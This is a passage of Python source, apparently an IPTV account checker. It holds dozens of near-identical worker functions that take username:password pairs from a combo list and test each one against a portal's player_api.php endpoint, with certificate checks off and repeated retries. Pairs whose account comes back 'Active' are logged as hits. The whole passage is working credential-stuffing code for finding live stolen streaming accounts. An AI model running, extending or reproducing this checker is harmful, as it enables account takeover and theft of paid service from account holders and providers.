                     onay(veri,user,pas)

def d42():
    global hit
    say=0
    for fyz in range(42,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_42'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d43():
    global hit
    say=0
    for fyz in range(43,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_43'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d44():
    global hit
    say=0
    for fyz in range(44,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_44'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d45():
    global hit
    say=0
    for fyz in range(45,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_45'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d46():
    global hit
    say=0
    for fyz in range(46,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_46'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d47():
    global hit
    say=0
    for fyz in range(47,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_47'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d48():
    global hit
    say=0
    for fyz in range(48,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_48'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d49():
    global hit
    say=0
    for fyz in range(49,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_49'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d50():
    global hit
    say=0
    for fyz in range(50,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_50'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d51():
    global hit
    say=0
    for fyz in range(51,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_51'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 ??                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d52():
    global hit
    say=0
    for fyz in range(52,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_52'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d53():
    global hit
    say=0
    for fyz in range(53,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_53'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)
                     
def d54():
    global hit
    say=0
    for fyz in range(54,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_54'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)                     

def d55():
    global hit
    say=0
    for fyz in range(55,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_55'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d56():
    global hit
    say=0
    for fyz in range(56,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_56'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d57():
    global hit
    say=0
    for fyz in range(57,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_57'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d58():
    global hit
    say=0
    for fyz in range(58,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_58'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d59():
    global hit
    say=0
    for fyz in range(59,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_59'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d60():
    global hit
    say=0
    for fyz in range(60,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_60'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d61():
    global hit
    say=0
    for fyz in range(61,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_61'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 ?? 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d62():
    global hit
    say=0
    for fyz in range(62,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_62'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d63():
    global hit
    say=0
    for fyz in range(63,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_63'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d64():
    global hit
    say=0
    for fyz in range(64,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_64'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d65():
    global hit
    say=0
    for fyz in range(65,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_65'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d66():
    global hit
    say=0
    for fyz in range(66,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_66'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d67():
    global hit
    say=0
    for fyz in range(67,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_67'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d68():
    global hit
    say=0
    for fyz in range(68,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
             bot='Bot_68'
             oran=""
             oran=round(((fyz)/(uz)*100),2)
             echox(user,pas,bot,fyz,oran,hit)
             
             
             link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
             bag1=0
             veri=""
             while True:
                 try:
                     res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
                     break
                 except:
                     bag1=bag1+1
                     time.sleep(2)
                     if bag1==100:
                           quit()
             veri=str(res.text)
             if 'username' in veri:
                 
                 status=veri.split('status":')[1]
                 status=status.split(',')[0]
                 status=status.replace('"',"")
                 if status=='Active':
                     print('     💢 💢 🇭 🇮 🇹💢 💢                  ')
                     hit=hit+1
                     onay(veri,user,pas)

def d69():
    global hit
    say=0
    for fyz in range(69,uz,botsay):
        up=re.search(pattern,totLen[fyz],re.IGNORECASE)
        if up:
             fyzz = totLen[fyz].split(":")
             try:
                 user=str(fyzz[0].replace(" ",""))
             except:
                 userr='MarkCarl'
             try:
                 pas=str(fyzz[1].replace(" ",""))
                 pas=str(pas.replace('\n',""))
             except:
                 pas='MarkCarl'
             say = int(say) +1
